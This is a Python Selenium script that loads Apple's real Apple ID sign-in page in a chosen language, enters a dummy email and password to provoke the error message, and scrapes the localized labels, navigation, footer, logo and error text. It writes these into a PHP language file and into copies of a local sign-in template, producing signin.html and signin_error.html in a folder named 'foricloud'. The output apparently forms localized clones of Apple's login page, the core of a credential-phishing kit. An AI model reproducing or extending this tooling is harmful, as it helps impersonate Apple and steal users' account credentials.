from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import os

location = "es"

locationPath = "E:\\foricloud\\"+location

profile = webdriver.FirefoxProfile()
profile.set_preference("intl.accept_languages", location)
driver = webdriver.Firefox(firefox_profile=profile, executable_path="C:\python\geckodriver.exe")
driver.get("https://appleid.apple.com/")
assert "Apple" in driver.title

f = open(locationPath+".php", 'w', encoding='utf-8')

f.write("<?php\n$lang = array(\n")

for element in driver.find_elements_by_class_name("pull-left"):
    f.write("\"appleid\" => \"" + element.text + "\",\n")
    print(element.text)
    appleid = element.text

for element in driver.find_elements_by_id("ac-globalnav"):
    f.write("\'nav\' => \'" + element.get_attribute("outerHTML") + "\',\n")

for element in driver.find_elements_by_class_name("btn-signin"):
    print(element.text)
    name = element.text
    f.write("\"signin\" => \"" + element.text + "\",\n")

for element in driver.find_elements_by_class_name("btn-create"):
    print(element.text)
    f.write("\"create\" => \"" + element.text + "\",\n")

for element in driver.find_elements_by_class_name("btn-faq"):
    print(element.text)
    f.write("\"faq\" => \"" + element.text + "\",\n")

manage = '<iframe src="./lang/'+location+'/signin.html" width="100%" height="100%" id="aid-auth-widget-iFrame" name="aid-auth-widget" scrolling="no" frameborder="0"></iframe>'
f.write("\'manage\' => \'" + manage + "\',\n")

time.sleep(3)
driver.switch_to_frame(driver.find_element_by_tag_name("iframe"))

elem = driver.find_elements_by_class_name("cnsmr-app-image")
logo = elem[0].get_attribute("src")

elem = driver.find_element_by_id("appleId")
elem.send_keys("ihaveww@mail.ru")

elem = driver.find_elements_by_class_name("pwd")
print(elem[0].text)
password = elem[0].text
f.write("\"password\" => \"" + elem[0].text + "\",\n")
elem = driver.find_elements_by_id("pwd")
elem[0].send_keys("qweqwe")
elem[0].send_keys(Keys.ENTER)
time.sleep(3)
elem = driver.find_element_by_id("errMsg")
print(elem.text)
error1 = elem.text

elem = driver.find_element_by_class_name("tk-subbody")
print(elem.text)
error2 = elem.text


elem = driver.find_element_by_id("remember-me-label")
print(elem.text)
remember = elem.text
f.write("\"remember\" => \"" + elem.text + "\",\n")

elem = driver.find_element_by_class_name("tk-intro")
print(elem.text)
manage = elem.text

driver.switch_to_default_content()

for element in driver.find_elements_by_id("forgot-link"):
    print(element.text)
    f.write("\"forgot\" => \"" + element.text + "\",\n")

for element in driver.find_elements_by_class_name("your-account"):
    print(element.text)
    f.write("\"your\" => \"" + element.text + "\",\n")

for element in driver.find_elements_by_class_name("intro-signin"):
    print(element.text)
    f.write("\"single\" => \"" + element.text + "\",\n")

for element in driver.find_elements_by_class_name("faq-link"):
    print(element.text)
    f.write("\"more\" => \"" + element.text + "\",\n")

for element in driver.find_elements_by_class_name("create-link"):
    print(element.text)
    f.write("\"createApple\" => \"" + element.text + "\",\n")

for element in driver.find_elements_by_class_name("ac-gf-footer"):
    #print(element.get_attribute("outerHTML"))
    f.write("\'buy\' => \'" + element.get_attribute("outerHTML") + "\');\n?>")

f.close()

f = open("E:\\signin.html", "r", encoding='utf-8')
text = f.read()
f.close()

if not os.path.exists(locationPath):
    os.makedirs(locationPath)
f = open(locationPath+"\\signin.html", "w", encoding='utf-8')
text = text.replace("Войти", name)
text = text.replace("Пароль", password)
text = text.replace("Запомнить меня", remember)
text = text.replace("Управление учетной записью Apple", manage)
text = text.replace("Неверный Apple&nbsp;ID или пароль.", error1)
text = text.replace("Забыли пароль?", error2)
text = text.replace("Apple ID", appleid)
text = text.replace("LOGOIMG", logo)
f.write(text)
f.close()

f = open(locationPath+"\\signin_error.html", "w", encoding='utf-8')
f.write(text.replace("hidden", ""))
f.close()

f = open(locationPath+".php", "r")
txt = f.read()
f.close()
f = open(locationPath+".php", "w")
f.write(txt.replace("ac-gn-link-support", "ac-gn-link-support-"+location))
f.close()

# elem.send_keys("pycon")
# elem.send_keys(Keys.RETURN)
f.close()
assert "No results found." not in driver.page_source
driver.close()